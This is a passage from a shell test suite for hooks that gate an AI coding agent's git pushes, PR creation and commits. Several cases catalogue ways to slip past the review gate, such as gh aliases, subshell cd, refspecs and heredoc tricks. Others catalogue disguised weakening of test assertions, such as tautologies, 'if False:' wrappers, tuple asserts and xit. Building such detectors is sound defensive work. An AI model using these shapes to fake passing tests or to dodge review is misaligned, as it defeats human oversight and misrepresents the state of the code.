# gh spellings the anchored regex missed:
gh2(){ printf '{"tool_name":"Bash","tool_input":{"command":"cd %s && %s"}}' "$R2" "$1"; }
run 2 "gh pr new (alias of create) → BLOCK"            "$REVIEW_GATE" "$(gh2 'gh pr new --fill')"
run 2 "gh pr -R o/r create → BLOCK"                    "$REVIEW_GATE" "$(gh2 'gh pr -R o/r create --fill')"
run 2 "env gh pr create → BLOCK"                       "$REVIEW_GATE" "$(gh2 'env gh pr create --fill')"
run 2 "command gh pr create → BLOCK"                   "$REVIEW_GATE" "$(gh2 'command gh pr create --fill')"
run 2 "if true; then gh pr create; fi → BLOCK"         "$REVIEW_GATE" "$(gh2 'if true; then gh pr create --fill; fi')"
run 0 "gh pr list --search create → allow (create is a value, not the subcommand)" "$REVIEW_GATE" "$(gh2 'gh pr list --search create')"
# cd tied to the PUSH, not to the first git word; subshell cd:
runin "$R5" 2 "git status && cd <code> && git push → BLOCK (cd before the push counts)" "$REVIEW_GATE" "$(bc "git status && cd $R2 && git push")"
runin "$R5" 2 "(cd <code> && git push) → BLOCK (subshell cd)" "$REVIEW_GATE" "$(bc "(cd $R2 && git push)")"
runin "$R2" 0 "(cd <docs> && git push) → allow (subshell cd, opposite)" "$REVIEW_GATE" "$(bc "(cd $R5 && git push)")"
# NON-HEAD refspecs: the push sends a branch that is not checked out.
R8=$(mktemp -d); mkrepo "$R8"; printf 'hi\n' > "$R8/README.md"; cm "$R8" base; pushbase "$R8"
git -C "$R8" checkout -q -b feat; printf 'var evil=1\n' > "$R8/evil.js"; cm "$R8"; git -C "$R8" checkout -q master
p8(){ printf '{"tool_name":"Bash","tool_input":{"command":"git -C %s push %s"}}' "$R8" "$1"; }
run 2 "on clean master: git push origin feat → BLOCK (refspec source, not HEAD)" "$REVIEW_GATE" "$(p8 'origin feat')"
run 2 "git push origin feat:master → BLOCK"            "$REVIEW_GATE" "$(p8 'origin feat:master')"
run 2 "git push origin +feat:master → BLOCK"           "$REVIEW_GATE" "$(p8 'origin +feat:master')"
run 2 "git push --all origin → BLOCK"                  "$REVIEW_GATE" "$(p8 '--all origin')"
run 2 "git push origin : (matching push) → BLOCK"      "$REVIEW_GATE" "$(p8 'origin :')"
run 2 "git push -o -n origin feat (-n is an option VALUE) → BLOCK" "$REVIEW_GATE" "$(p8 '-o -n origin feat')"
run 2 "git push --push-option -d origin feat → BLOCK"  "$REVIEW_GATE" "$(p8 '--push-option -d origin feat')"
run 2 "git push origin nosuchref → BLOCK (unresolvable source fails toward review)" "$REVIEW_GATE" "$(p8 'origin nosuchref')"
run 0 "git push origin master (clean branch) → allow"  "$REVIEW_GATE" "$(p8 'origin master')"
run 2 "gh pr create --head feat → BLOCK"               "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $R8 && gh pr create --head feat --fill\"}}"
run 2 "gh pr create --head me:feat → BLOCK"            "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cd $R8 && gh pr create -H me:feat --fill\"}}"
# Reviewed in its worktree, pushed by name from the primary checkout → allow.
W8="$R8.wt"; git -C "$R8" worktree add -q "$W8" feat
node "$WRITE_FLAG" --verdict PASS --repo "$W8" >/dev/null 2>&1
run 0 "feat reviewed in its worktree, pushed by name from primary → allow" "$REVIEW_GATE" "$(p8 'origin feat')"
FLAG8=$(flagof "$W8"); git -C "$R8" worktree remove --force "$W8"; rm -f "$FLAG8"; rm -rf "$R8" "$R8.origin.git"
# COMMIT + PUSH in one cell: the commit has not happened when the gate runs.
R9=$(mktemp -d); mkrepo "$R9"; printf 'var a=1\n' > "$R9/f.js"; printf 'hi\n' > "$R9/README.md"; cm "$R9" base; pushbase "$R9"
printf 'var evil=2\n' >> "$R9/f.js"
run 2 "commit -am && push, code only uncommitted → BLOCK (worktree surface)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R9 commit -qam x && git -C $R9 push\"}}"
run 0 "same code uncommitted, push alone → allow (not sent)" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R9 push\"}}"
git -C "$R9" checkout -q -- f.js; printf 'var n=1\n' > "$R9/n.js"
run 2 "add -A && commit && push with NEW untracked code → BLOCK" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R9 add -A && git -C $R9 commit -qm x && git -C $R9 push\"}}"
rm -f "$R9/n.js"; printf 'more\n' >> "$R9/README.md"
run 0 "add -A && commit && push, docs only → allow"    "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R9 add -A && git -C $R9 commit -qm x && git -C $R9 push\"}}"
rm -rf "$R9" "$R9.origin.git"
# Dangling origin/HEAD falls back to origin/master instead of the whole repo:
R10=$(mktemp -d); mkrepo "$R10"; printf 'var l=1\n' > "$R10/lib.js"; cm "$R10" base; pushbase "$R10"
git -C "$R10" symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main
printf '# d\n' > "$R10/doc.md"; cm "$R10"
run 0 "origin/HEAD dangling → falls back to origin/master; docs-only push → allow" "$REVIEW_GATE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git -C $R10 push\"}}"
rm -rf "$R10" "$R10.origin.git"
# No remote: /review --delta keeps the old uncommitted-only surface (no whole-repo review).
R11=$(mktemp -d); git -C "$R11" init -q; git -C "$R11" config user.email t@t; git -C "$R11" config user.name t
printf 'x=1\n' > "$R11/a.py"; printf 'y=1\n' > "$R11/b.py"; cm "$R11" base; printf 'x=2\n' >> "$R11/a.py"
D=$(node "$REVIEW_GATE" --delta --repo "$R11")
case "$D" in *b.py*) fail "no remote: --delta excludes committed b.py" "included" "excluded";; *a.py*) pass "no remote: --delta excludes committed b.py";; *) fail "no remote: --delta excludes committed b.py" "empty" "a.py only";; esac
rm -rf "$R11"

# Heredoc BODIES that merely mention a send (S81 live: the fix-round commit message
# quoted `gh pr create --head X` and the gate blocked the COMMIT on "cannot resolve X").
# Bodies are blanked only when the terminator is found exactly; anything unsure stays
# scannable (fail closed). Each BLOCK case is a shape where blanking too much would
# hide a real send.
hd(){ printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$1"; }
run 0 "commit -F - heredoc body mentioning git push / gh pr create --head X → allow" "$REVIEW_GATE" "$(hd "git -C $R2 commit -F - <<'EOF'\\nthen git push origin nosuch\\nand gh pr create --head X\\nEOF")"
run 2 "heredoc commit, then a REAL push after the terminator → BLOCK" "$REVIEW_GATE" "$(hd "git -C $R2 commit -F - <<'EOF'\\nmsg\\nEOF\\ngit -C $R2 push")"
run 2 "unterminated heredoc → body stays scannable → BLOCK" "$REVIEW_GATE" "$(hd "cat <<EOF\\ngit -C $R2 push")"
run 2 "indented terminator, no real one → unterminated → BLOCK" "$REVIEW_GATE" "$(hd "cat <<EOF\\n  EOF\\ngit -C $R2 push")"
run 0 "indented '  EOF' does not close <<EOF; body runs to the real EOF → allow" "$REVIEW_GATE" "$(hd "cat <<EOF\\n  EOF\\ngit -C $R2 push\\nEOF")"
run 2 "quoted \\\"<<EOF\\\" is not a heredoc → BLOCK"      "$REVIEW_GATE" "$(hd "echo \\\"<<EOF\\\"\\ngit -C $R2 push\\nEOF")"
run 2 "commented # <<EOF is not a heredoc → BLOCK"        "$REVIEW_GATE" "$(hd "true # <<EOF\\ngit -C $R2 push\\nEOF")"
run 0 "<<-EOF closes on a TAB-indented terminator → allow" "$REVIEW_GATE" "$(hd "cat <<-EOF\\ngit -C $R2 push\\n\\tEOF")"
run 2 "<<-EOF does NOT close on a SPACE-indented terminator → BLOCK" "$REVIEW_GATE" "$(hd "cat <<-EOF\\ngit -C $R2 push\\n  EOF")"
run 2 "two heredocs on one line: second body ends, then real push → BLOCK" "$REVIEW_GATE" "$(hd "cat <<A <<B\\nx\\nA\\ny\\nB\\ngit -C $R2 push")"
run 0 "two heredocs on one line, push only inside bodies → allow" "$REVIEW_GATE" "$(hd "cat <<A <<B\\ngit -C $R2 push\\nA\\ngit -C $R2 push\\nB")"

# ---- S81 re-check round (adversarial reviewer, fix round cc3b527) ----
# Same-cell state changes BEFORE the send: the hook runs before any of them happen.
R12=$(mktemp -d); mkrepo "$R12"; printf 'var a=1\n' > "$R12/f.js"; printf 'hi\n' > "$R12/README.md"; cm "$R12" base; pushbase "$R12"
git -C "$R12" checkout -q -b feat; printf 'd\n' > "$R12/doc.md"; cm "$R12"; git -C "$R12" checkout -q master
printf 'var evil=1\n' >> "$R12/f.js"
run 2 "checkout feat && commit -am && push origin feat (uncommitted code carried over) → BLOCK" "$REVIEW_GATE" "$(hd "cd $R12 && git checkout feat && git commit -qam x && git push origin feat")"
git -C "$R12" checkout -q -- f.js; printf 'more\n' >> "$R12/README.md"
run 0 "checkout -b new && add && commit && push -u origin new, docs only → allow (branch not yet created)" "$REVIEW_GATE" "$(hd "cd $R12 && git checkout -b newb && git add -A && git commit -qm d && git push -u origin newb")"
printf 'var z=1\n' >> "$R12/f.js"
run 2 "checkout -b new && commit -am && push origin new, code → BLOCK" "$REVIEW_GATE" "$(hd "cd $R12 && git checkout -b newb && git commit -qam d && git push -u origin newb")"
git -C "$R12" checkout -q -- f.js README.md
# A same-cell commit must not HIDE committed code by switching to the worktree view.
printf 'var c=2\n' >> "$R12/f.js"; cm "$R12"; git -C "$R12" show HEAD~1:f.js > "$R12/f.js"
run 2 "unpushed code commit, worktree reverted, commit --allow-empty && push → BLOCK (committed still checked)" "$REVIEW_GATE" "$(hd "git -C $R12 commit --allow-empty -qm x && git -C $R12 push")"
git -C "$R12" checkout -q -- f.js; git -C "$R12" reset -q --hard HEAD~1
# --follow-tags sends only annotated tags reachable from what is pushed — not every unmerged tag.
git -C "$R12" checkout -q -b rel; printf 'var r=1\n' > "$R12/r.js"; cm "$R12"; git -C "$R12" tag v0.9; git -C "$R12" checkout -q master
printf 'd2\n' > "$R12/d2.md"; cm "$R12"
run 0 "push --follow-tags with an old unmerged lightweight tag, docs-only branch → allow" "$REVIEW_GATE" "$(hd "git -C $R12 push --follow-tags")"
run 2 "push --tags still checks unmerged tags → BLOCK" "$REVIEW_GATE" "$(hd "git -C $R12 push --tags")"
# A tag created in the same cell resolves to what it will point at (automate-me 2026-10-24).
run 0 "tag (docs-only HEAD) && push that tag → allow" "$REVIEW_GATE" "$(hd "git -C $R12 tag v1.0 && git -C $R12 push origin v1.0")"
run 2 "tag -a -m msg on unreviewed code && push that tag → BLOCK" "$REVIEW_GATE" "$(hd "git -C $R12 tag -a v1.1 -m rel rel && git -C $R12 push origin v1.1")"
run 2 "push a tag that nothing creates → BLOCK (unresolvable)" "$REVIEW_GATE" "$(hd "git -C $R12 push origin v9.9")"
rm -rf "$R12" "$R12.origin.git"
# Heredoc shapes where blanking would hide a command bash RUNS (each verified with bash):
run 2 "marker line ending in a backslash continues the command → BLOCK" "$REVIEW_GATE" "$(hd "cat <<EOF \\\\\\n\\u0026\\u0026 git -C $R2 push\\nbody\\nEOF")"
run 2 "<<EOF inside a multi-line quoted string → BLOCK"   "$REVIEW_GATE" "$(hd "echo \\\"start\\n<<EOF\\\"\\ngit -C $R2 push\\nEOF")"
run 2 "quote opened AFTER the marker stays open past the line → BLOCK" "$REVIEW_GATE" "$(hd "echo \\\"a\\n<<EOF b\\\"\\ngit -C $R2 push\\nEOF")"
run 2 "<< as an arithmetic shift → BLOCK"                "$REVIEW_GATE" "$(hd "echo \$((1<<2))\\ngit -C $R2 push\\n2")"
run 2 "mixed-quote delimiter 'EOF'x → BLOCK"              "$REVIEW_GATE" "$(hd "cat <<'EOF'x\\nhi\\nEOFx\\ngit -C $R2 push\\nEOF")"

FLAG5=$(flagof "$R5" 2>/dev/null); [ -n "${FLAG5:-}" ] && rm -f "$FLAG5"
rm -rf "$R5" "$R5.origin.git"

rm -rf "$R2" "$R2.origin.git"; rm -f "$FLAG2"

echo "== 3. eval-first (stdin wiring + block, temp repo) =="
R=$(mktemp -d); ( cd "$R" && git init -q && git config user.email t@t && git config user.name t && printf 'x' > a.js && git add a.js )
# Hooks resolve the repo via process.cwd(), so the canary must run inside the temp repo.
gotc=$(cd "$R" && printf '%s' '{"tool_name":"Bash","tool_input":{"command":"git commit -m x"}}' | CLAUDE_EVAL_FIRST_BLOCK=1 node "$HOOKS/check-eval-first.js" >/dev/null 2>&1; echo $?)
[ "$gotc" = 2 ] && pass "source+no-tests BLOCK=1 → BLOCK (cwd)" || fail "source+no-tests BLOCK=1 → BLOCK (cwd)" "$gotc" 2
( cd "$R" && printf 'expect(1).toBe(1)' > a.test.js && git add a.test.js )
gota=$(cd "$R" && printf '%s' '{"tool_name":"Bash","tool_input":{"command":"git commit -m x"}}' | CLAUDE_EVAL_FIRST_BLOCK=1 node "$HOOKS/check-eval-first.js" >/dev/null 2>&1; echo $?)
[ "$gota" = 0 ] && pass "test file present → allow" || fail "test file present → allow" "$gota" 0
rm -rf "$R"

# S81 replay trial: `git add X && git commit` in ONE cell (7/8 trial commits were shaped so) runs
# the hook before the add, so the index is empty and the gate went dark; and a session working in
# a SUBDIRECTORY made `git ls-files` (cwd-relative) find 0 tests in a repo holding 126.
ef(){ local d="$1" cmd="$2"; (cd "$d" && printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$cmd" | CLAUDE_EVAL_FIRST_BLOCK=1 node "$HOOKS/check-eval-first.js" >/dev/null 2>&1; echo $?); }
R=$(mktemp -d); ( cd "$R" && git init -q && git config user.email t@t && git config user.name t && printf 'x' > README.md && git add README.md && git commit -qm base && printf 'x=1' > src.py )
[ "$(ef "$R" 'git add src.py && git commit -m x')" = 2 ] && pass "eval-first: add+commit in one cell, no tests → BLOCK" || fail "eval-first: add+commit in one cell, no tests → BLOCK" "$(ef "$R" 'git add src.py && git commit -m x')" 2
[ "$(ef "$R" 'git add -A && git commit -m x')" = 2 ] && pass "eval-first: add -A+commit, no tests → BLOCK" || fail "eval-first: add -A+commit, no tests → BLOCK" "$(ef "$R" 'git add -A && git commit -m x')" 2
[ "$(ef "$R" 'git add README.md && git commit -m x')" = 0 ] && pass "eval-first: same cell adds only docs → allow" || fail "eval-first: same cell adds only docs → allow" "$(ef "$R" 'git add README.md && git commit -m x')" 0
rm -rf "$R"
R=$(mktemp -d); ( cd "$R" && git init -q && git config user.email t@t && git config user.name t && mkdir -p tests src && printf 'assert 1' > tests/test_x.py && git add -A && git commit -qm base && printf 'x=1' > src/a.py && git add src/a.py )
[ "$(ef "$R/src" 'git commit -m x')" = 0 ] && pass "eval-first: cwd in a SUBDIRECTORY still sees root tests → allow" || fail "eval-first: cwd in a SUBDIRECTORY still sees root tests → allow" "$(ef "$R/src" 'git commit -m x')" 0
rm -rf "$R"

# Review of 18d86ef (adversarial, reproduced): an unrelated add narrowed `commit -a` to the add's
# paths; the same-cell query ran from a subdirectory; `-A <path>` and `-u` were read as whole-tree
# with untracked; an add in ANOTHER repo counted here. Repo: no tests, tracked lib/b.py modified,
# untracked scratch.py, docs/ with a modified README.
R=$(mktemp -d); ( cd "$R" && git init -q && git config user.email t@t && git config user.name t && mkdir -p lib docs sub && printf 'x=1' > lib/b.py && printf 'd' > docs/README.md && printf 'k' > sub/keep.txt && git add -A && git commit -qm base && printf 'x=2' > lib/b.py && printf 'd2' > docs/README.md && printf 's' > scratch.py )
O=$(mktemp -d); ( cd "$O" && git init -q )
[ "$(ef "$R" 'git add docs/README.md && git commit -am docs')" = 2 ] && pass "eval-first: unrelated add does not narrow commit -a → BLOCK" || fail "eval-first: add + commit -am → BLOCK" "$(ef "$R" 'git add docs/README.md && git commit -am docs')" 2
[ "$(ef "$R/sub" 'git commit -am x')" = 2 ] && pass "eval-first: commit -am from a SUBDIRECTORY sees the whole tree → BLOCK" || fail "eval-first: subdir commit -am → BLOCK" "$(ef "$R/sub" 'git commit -am x')" 2
[ "$(ef "$R/sub" 'git add -A && git commit -m x')" = 2 ] && pass "eval-first: add -A from a SUBDIRECTORY sees the whole tree → BLOCK" || fail "eval-first: subdir add -A → BLOCK" "$(ef "$R/sub" 'git add -A && git commit -m x')" 2
[ "$(ef "$R" 'git add -A docs/ && git commit -m x')" = 0 ] && pass "eval-first: add -A <dir> stages only that dir → allow" || fail "eval-first: add -A docs/ → allow" "$(ef "$R" 'git add -A docs/ && git commit -m x')" 0
( cd "$R" && git checkout -q -- lib/b.py )
[ "$(ef "$R" 'git add -u && git commit -m x')" = 0 ] && pass "eval-first: add -u ignores UNTRACKED source → allow" || fail "eval-first: add -u → allow" "$(ef "$R" 'git add -u && git commit -m x')" 0
[ "$(ef "$R" "git -C $O add . && git commit -m x")" = 0 ] && pass "eval-first: an add in ANOTHER repo does not count here → allow" || fail "eval-first: other-repo add → allow" "$(ef "$R" "git -C $O add . && git commit -m x")" 0
rm -rf "$R" "$O"

echo "== 4. anticheat (stdin wiring + RSpec pattern, temp repo) =="
acc(){ local cmd="$1" R got; R=$(mktemp -d); ( cd "$R" && git init -q && git config user.email t@t && git config user.name t && : > plan.md \
    && printf '    assert total == 56\n' > test_a.py && git add -A && git commit -qm base && printf '    assert total >= 0\n' > test_a.py && printf 'n' > notes.txt )
  got=$(cd "$R" && printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' "$cmd" | CLAUDE_ANTICHEAT_BLOCK=1 node "$HOOKS/check-anticheat.js" >/dev/null 2>&1; echo $?); rm -rf "$R"; echo "$got"; }
[ "$(acc 'git add -A && git commit -m x')" = 2 ] && pass "anticheat: weakening staged by add -A in the SAME cell → BLOCK" || fail "anticheat: add -A same cell → BLOCK" "$(acc 'git add -A && git commit -m x')" 2
# The block message must name the override, or the agent retries unchanged (automate-me 2026-10-24: ~10 of 18 blocks).
accmsg(){ local R; R=$(mktemp -d); ( cd "$R" && git init -q && git config user.email t@t && git config user.name t && : > plan.md \
    && printf '    assert total == 56\n' > test_a.py && git add -A && git commit -qm base && printf '    assert total >= 0\n' > test_a.py && git add -A )
  (cd "$R" && printf '{"tool_name":"Bash","tool_input":{"command":"git commit -m x"}}' | CLAUDE_ANTICHEAT_BLOCK=1 node "$HOOKS/check-anticheat.js" 2>&1 >/dev/null); rm -rf "$R"; }
accmsg | grep -q 'ANTICHEAT-OK: <one-line reason>' && pass "anticheat: block message names the override" || fail "anticheat: block message names the override" "$(accmsg | tail -3)" "ANTICHEAT-OK"
[ "$(acc 'git add test_a.py && git commit -m x')" = 2 ] && pass "anticheat: weakening staged by pathspec add in the same cell → BLOCK" || fail "anticheat: pathspec add same cell → BLOCK" "$(acc 'git add test_a.py && git commit -m x')" 2
[ "$(acc 'git commit -am x')" = 2 ] && pass "anticheat: commit -am picks up the weakening → BLOCK" || fail "anticheat: commit -am → BLOCK" "$(acc 'git commit -am x')" 2
[ "$(acc 'git add notes.txt && git commit -am x')" = 2 ] && pass "anticheat: unrelated add does not narrow commit -am → BLOCK" || fail "anticheat: add + commit -am → BLOCK" "$(acc 'git add notes.txt && git commit -am x')" 2
[ "$(acc 'git commit -m x -- test_a.py')" = 2 ] && pass "anticheat: commit -- <path> commits that path → BLOCK" || fail "anticheat: commit -- path → BLOCK" "$(acc 'git commit -m x -- test_a.py')" 2
[ "$(acc 'git add -A notes.txt && git commit -m x')" = 0 ] && pass "anticheat: add -A <unrelated path> → allow" || fail "anticheat: add -A notes.txt → allow" "$(acc 'git add -A notes.txt && git commit -m x')" 0
[ "$(acc 'git add notes.txt && git commit -m x')" = 0 ] && pass "anticheat: same cell adds an UNRELATED file only → allow" || fail "anticheat: unrelated add → allow" "$(acc 'git add notes.txt && git commit -m x')" 0
R=$(mktemp -d); ( cd "$R" && git init -q && git config user.email t@t && git config user.name t && : > plan.md && printf 'it "x" do\n  expect(a).to eq(1)\nend\n' > model_spec.rb && git add model_spec.rb && git commit -qm base && printf 'it "x" do\nend\n' > model_spec.rb && git add model_spec.rb )
gotr=$(cd "$R" && printf '%s' '{"tool_name":"Bash","tool_input":{"command":"git commit -m x"}}' | CLAUDE_ANTICHEAT_BLOCK=1 node "$HOOKS/check-anticheat.js" >/dev/null 2>&1; echo $?)
[ "$gotr" = 2 ] && pass "removed RSpec assertion, BLOCK=1 → BLOCK" || fail "removed RSpec assertion, BLOCK=1 → BLOCK" "$gotr" 2
rm -rf "$R"

# Allow-list pairing (P3, 2026-09-15). Fire audit: 12/16 fires were EDITED asserts read as deletions,
# 0 true positives — so the must-BLOCK side below is the only evidence the hook still catches
# cheating. Every must-BLOCK case after the first six is a bypass a reviewer CONSTRUCTED against the
# similarity-based first draft (correctness + adversarial, 2026-09-15); all blocked under the old rule.
# ac <want> <label> <file> <before-body> <after-body> [big|gitattr|rename:<path>]: base commit = before, staged = after, BLOCK=1.
ac(){ local want="$1" label="$2" file="$3" before="$4" after="$5" big="${6:-}" R got
  R=$(mktemp -d); ( cd "$R" && git init -q && git config user.email t@t && git config user.name t && : > plan.md \
    && mkdir -p "$(dirname "$file")" && printf '%s\n' "$before" > "$file" && git add -A && git commit -qm base && case "$big" in rename:*) git mv "$file" "${big#rename:}"; file="${big#rename:}";; esac \
    && printf '%s\n' "$after" > "$file" \
    && case "$big" in big) head -c 1500000 /dev/zero | tr '\0' x > fixture.txt;; gitattr) printf '*.py -diff\n' > .gitattributes;; esac && git add -A )
  got=$(cd "$R" && printf '%s' '{"tool_name":"Bash","tool_input":{"command":"git commit -m x"}}' | CLAUDE_ANTICHEAT_BLOCK=1 node "$HOOKS/check-anticheat.js" >/dev/null 2>&1; echo $?)
  rm -rf "$R"; [ "$got" = "$want" ] && pass "$label" || fail "$label" "$got" "$want"; }
# must BLOCK — the first draft's own cases
ac 2 "anticheat: exact → cannot-fail (== 56 → >= 0) → BLOCK" test_a.py '    assert total == 56' '    assert total >= 0'
ac 2 "anticheat: exact → looser (== 5 → > 4) → BLOCK" test_a.py '    assert count == 5' '    assert count > 4'
ac 2 "anticheat: inverted (assert not ok → assert ok) → BLOCK" test_a.py '    assert not ok, "must reject"' '    assert ok, "must reject"'
ac 2 "anticheat: inverted JS (toBe(true) → toBe(false)) → BLOCK" a.test.js '  expect(valid).toBe(true);' '  expect(valid).toBe(false);'
ac 2 "anticheat: hard assert deleted, unrelated assert True added → BLOCK" test_a.py '    assert parse("M8x1.25") == ("M8", 1.25)' '    assert True'
ac 2 "anticheat: hard assert deleted, unrelated failable assert added → BLOCK" test_a.py '    assert parse("M8x1.25") == ("M8", 1.25)' '    assert config.loaded'
# must BLOCK — reviewer-constructed bypasses of the similarity draft
ac 2 "anticheat: is None → is not None → BLOCK" test_a.py '    assert x is None' '    assert x is not None'
ac 2 "anticheat: floor division is not a comment (n // 3 == 4 → >= 0) → BLOCK" test_a.py '    assert n // 3 == 4' '    assert n // 3 >= 0'
ac 2 "anticheat: exact → bare truthiness (== expected → plain) → BLOCK" test_a.py '    assert parse(x) == 5' '    assert parse(x)'
ac 2 "anticheat: tautology (== 56 → == total) → BLOCK" test_a.py '    assert total == 56' '    assert total == total'
ac 2 "anticheat: or-escape (== 5 → == 5 or x) → BLOCK" test_a.py '    assert x == 5' '    assert x == 5 or x'
ac 2 "anticheat: RSpec to → not_to → BLOCK" user_spec.rb '    expect(x).to eq(5)' '    expect(x).not_to eq(5)'
ac 2 "anticheat: RSpec matcher swap (be_valid → be_present) → BLOCK" user_spec.rb '    expect(user).to be_valid' '    expect(user).to be_present'
ac 2 "anticheat: JS .not added with a new value → BLOCK" a.test.js '  expect(x).toBe(5);' '  expect(x).not.toBe(6);'
ac 2 "anticheat: Go testify Equal → NotEqual → BLOCK" calc_test.go '	assert.Equal(t, 5, got)' '	assert.NotEqual(t, 5, got)'
ac 2 "anticheat: short unrelated swap (x == 1 → y == 2) → BLOCK" test_a.py '    assert x == 1' '    assert y == 2'
ac 2 "anticheat: JS strict → loose inequality (=== → !==) → BLOCK" a.test.js '  expect(a === b).toBe(true);' '  expect(a !== b).toBe(true);'
ac 2 "anticheat: repeated assert deleted from ONE test → BLOCK" test_a.py "$(printf 'def test_a():\n    r = get("/a")\n    assert r.status_code == 200\ndef test_b():\n    r = get("/admin")\n    assert r.status_code == 200')" "$(printf 'def test_a():\n    r = get("/a")\n    assert r.status_code == 200\ndef test_b():\n    r = get("/admin")')"
ac 2 "anticheat: steal (x==5,y>=1 → y==1,x>4) → BLOCK" test_a.py "$(printf '    assert x == 5\n    assert y >= 1')" "$(printf '    assert y == 1\n    assert x > 4')"
# must BLOCK — round-2 review (2026-09-15)
ac 2 "anticheat: test path with a SPACE is still gated (git tab-terminates the header) → BLOCK" "my tests/test_a.py" '    assert total == 56' '    assert total >= 0'
ac 2 "anticheat: JS unrelated swap (callee names are not shared ids) → BLOCK" a.test.js '  expect(x).toBe(1);' '  expect(y).toBe(2);'
ac 2 "anticheat: Go unrelated swap (t is not a shared id) → BLOCK" calc_test.go '	assert.Equal(t, 5, got)' '	assert.Equal(t, 5, other)'
ac 2 "anticheat: > 0 → == 0 is a contradiction, not a strengthening → BLOCK" test_a.py '    assert len(errs) > 0' '    assert len(errs) == 0'
ac 2 "anticheat: >= 1 → == 0 (value changed too) → BLOCK" test_a.py '    assert len(rows) >= 1' '    assert len(rows) == 0'
ac 0 "anticheat: >= 1 → == 1 (same value) is a strengthening → allow" test_a.py '    assert len(rows) >= 1' '    assert len(rows) == 1'
# must BLOCK — round-2 structural fixes (numbered slots, interpolation, hunk scope, rename, diff flags, tabs)
ac 2 "anticheat: variable tautology (result == expected → result == result) → BLOCK" test_a.py '    assert result == expected' '    assert result == result'
ac 2 "anticheat: JS variable tautology (toEqual(expected) → toEqual(result)) → BLOCK" a.test.js '  expect(result).toEqual(expected);' '  expect(result).toEqual(result);'
ac 2 "anticheat: unittest tautology (assertEqual(result, expected) → (expected, expected)) → BLOCK" test_a.py '        self.assertEqual(result, expected)' '        self.assertEqual(expected, expected)'
ac 2 "anticheat: JS interpolation tautology (toBe(\"Bob\") → toBe(\`\${name}\`)) → BLOCK" a.test.js '  expect(name).toBe("Bob");' '  expect(name).toBe(`${name}`);'
ac 2 "anticheat: strict < → == is not a strengthening → BLOCK" test_a.py '    assert len(cache) < max_size' '    assert len(cache) == max_size'
ac 2 "anticheat: assert moved to another test (different hunk) → BLOCK" test_a.py "$(printf 'def test_admin():\n    r = get(\"/admin\")\n    assert r.status_code == 403\n\n\n\n\n\n\ndef test_a():\n    r = get(\"/a\")')" "$(printf 'def test_admin():\n    r = get(\"/admin\")\n\n\n\n\n\n\ndef test_a():\n    r = get(\"/a\")\n    assert r.status_code == 403')"
ac 2 "anticheat: spaces → tabs + if False (tab = 8 columns) → BLOCK" test_a.py '        assert total == 56' "$(printf '\tif False:\n\t\tassert total == 56')"
# Multi-line body so git DETECTS a rename (a 1-line file changed 100% reads as delete+add, which the
# deletion path blocks anyway — that fixture let a no-oldFile mutant survive).
ac 2 "anticheat: rename test file to non-test name + weaken → BLOCK" test_a.py "$(printf 'import m\n\n\ndef test_total():\n    total = m.compute()\n    assert total == 56\n    assert m.ready\n    assert m.name == \"x\"\n')" "$(printf 'import m\n\n\ndef test_total():\n    total = m.compute()\n    assert total >= 0\n    assert m.ready\n    assert m.name == \"x\"\n')" rename:checks_a.py
ac 2 "anticheat: staged .gitattributes -diff does not blank the diff → BLOCK" test_a.py '    assert total == 56' '    assert total >= 0' gitattr
ac 0 "anticheat: symmetric swap (got == want → want == got) → allow" test_a.py '    assert got == want' '    assert want == got'
ac 2 "anticheat: empty-string containment (\"timeout\" in msg → \"\" in msg) → BLOCK" test_a.py '    assert "timeout" in msg' '    assert "" in msg'
ac 2 "anticheat: variable tautology through a call (f(a) == b → f(b) == b) → BLOCK" test_a.py '    assert f(a) == b' '    assert f(b) == b'
ac 0 "anticheat: attribute rename on both sides (got.id == want.id → got.uid == want.uid) → allow" test_a.py '    assert got.id == want.id' '    assert got.uid == want.uid'
# must BLOCK — security-review bypasses (2026-09-15)
ac 2 "anticheat: identical assert re-added under if False: (deeper) → BLOCK" test_a.py '    assert total == 56' "$(printf '    if False:\n        assert total == 56')"
ac 2 "anticheat: tuple assert (always truthy) → BLOCK" test_a.py '    assert total == 56' '    assert (total == 56, "must be 56")'
ac 2 "anticheat: assert turned into a string → BLOCK" test_a.py '    assert total == 56' '    note = "assert total == 56"'
ac 2 "anticheat: it → xit → BLOCK" a.test.js '  it("works", () => { expect(x).toBe(5); });' '  xit("works", () => { expect(x).toBe(5); });'
ac 2 "anticheat: 1.5 MB staged fixture does not disable the gate → BLOCK" test_a.py '    assert total == 56' '    assert total >= 0' big
# linear string blanking: 400 backslashes (printf emits 2 per iteration) in an unclosed triple-quoted string must finish fast
T0=$(date +%s)
ac 2 "anticheat: backslash-heavy unclosed string (ReDoS shape) → BLOCK" test_a.py "    assert out == \"\"\"$(printf '\\\\%.0s' $(seq 1 200))" "    assert out != \"\"\"$(printf '\\\\%.0s' $(seq 1 200))"
[ $(( $(date +%s) - T0 )) -le 3 ] && pass "anticheat: ReDoS shape finishes in ≤3 s" || fail "anticheat: ReDoS shape finishes in ≤3 s" "$(( $(date +%s) - T0 ))s" "≤3s"
# must ALLOW — honest edits
ac 0 "anticheat: value edit (== \"1.1.0\" → == \"1.2.0\") → allow" test_a.py '    assert v == "1.1.0"' '    assert v == "1.2.0"'
ac 0 "anticheat: strengthened (<= → ==, message+comment added) → allow" test_a.py '    assert states <= set(m.SOURCES)' '    assert states == set(m.SOURCES), states   # every state has a fixture'
ac 0 "anticheat: message-only change with \"not in\" inside the string → allow" test_a.py '    assert x == 1, f"{a} missing"' '    assert x == 1, f"{a} is not in the list"'
ac 0 "anticheat: fixture rename in call → allow" test_a.py '    assert _r54(rec, PATTERN_OLD_INPUT) is False' '    assert _r54(rec, PATTERN_NEW_INPUT) is False'
